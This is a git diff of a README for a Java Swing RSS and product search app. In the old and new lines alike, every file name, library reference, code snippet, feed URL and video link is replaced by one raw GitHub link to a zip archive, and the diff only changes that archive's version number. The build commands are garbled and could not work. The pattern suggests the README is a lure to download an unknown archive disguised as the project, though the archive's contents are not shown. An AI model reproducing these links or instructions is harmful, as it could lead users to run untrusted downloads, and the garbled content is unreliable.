@@ -60,7 +60,7 @@ A modern Java Swing desktop application for **RSS news searching** and **product
 ### Prerequisites
 
 * **Java JDK 8+** installed on your system
-* `https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip` library (included in project)
+* `https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip` library (included in project)
 
 ### Quick Start
 
@@ -68,28 +68,28 @@ A modern Java Swing desktop application for **RSS news searching** and **product
 
 ```powershell
 cd "c:\Users\vuvan\OneDrive\Desktop\bai-tap-tuan-7-main\bai-tap-tuan-7-main"
-javac -encoding UTF-8 -cp https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip
-java -cp ".;https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip" InternetSearchApp
+javac -encoding UTF-8 -cp https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip
+java -cp ".;https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip" InternetSearchApp
 ```
 
 #### **Method 2: Using Command Prompt**
 
 ```cmd
 cd c:\Users\vuvan\OneDrive\Desktop\bai-tap-tuan-7-main\bai-tap-tuan-7-main
-javac -encoding UTF-8 -cp https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip
-java -cp .;https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip InternetSearchApp
+javac -encoding UTF-8 -cp https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip
+java -cp .;https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip InternetSearchApp
 ```
 
 #### **Method 3: One-liner (PowerShell)**
 
 ```powershell
-cd "c:\Users\vuvan\OneDrive\Desktop\bai-tap-tuan-7-main\bai-tap-tuan-7-main"; javac -encoding UTF-8 -cp https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip; java -cp ".;https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip" InternetSearchApp
+cd "c:\Users\vuvan\OneDrive\Desktop\bai-tap-tuan-7-main\bai-tap-tuan-7-main"; javac -encoding UTF-8 -cp https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip; java -cp ".;https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip" InternetSearchApp
 ```
 
 #### **Method 4: One-liner (CMD)**
 
 ```cmd
-cd c:\Users\vuvan\OneDrive\Desktop\bai-tap-tuan-7-main\bai-tap-tuan-7-main && javac -encoding UTF-8 -cp https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip && java -cp .;https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip InternetSearchApp
+cd c:\Users\vuvan\OneDrive\Desktop\bai-tap-tuan-7-main\bai-tap-tuan-7-main && javac -encoding UTF-8 -cp https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip && java -cp .;https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip InternetSearchApp
 ```
 
 ---
@@ -122,9 +122,9 @@ cd c:\Users\vuvan\OneDrive\Desktop\bai-tap-tuan-7-main\bai-tap-tuan-7-main && ja
 ```
 bai-tap-tuan-7/
 │
-├── https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip      # Main application (290+ lines)
-├── https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip            # HTML parsing library
-└── https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip                   # This file
+├── https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip      # Main application (290+ lines)
+├── https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip            # HTML parsing library
+└── https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip                   # This file
 ```
 
 ---
@@ -133,12 +133,12 @@ bai-tap-tuan-7/
 
 ### Change RSS Sources
 
-Edit the RSS feed list in `https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip`:
+Edit the RSS feed list in `https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip`:
 
 ```java
-https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip(
-    "https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip\n" +
-    "https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip\n" +
+https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip(
+    "https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip\n" +
+    "https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip\n" +
     // Add more feeds here
 );
 ```
@@ -150,7 +150,7 @@ https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3
 | Issue | Solution |
 |-------|----------|
 | `Class not found` | Make sure you're in the correct directory |
-| `Jsoup not found` | Ensure `https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip` is in the same folder |
+| `Jsoup not found` | Ensure `https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip` is in the same folder |
 | `Vietnamese characters not showing` | Use `javac -encoding UTF-8` |
 | `Links don't open` | Check your default browser settings |
 
@@ -176,6 +176,6 @@ MIT License — free to use and modify
 
 Created as part of **Tuần 7 Assignment**
 
-Video demo: https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip
+Video demo: https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_v1.8.zip
 
 **Last Updated:** December 2025
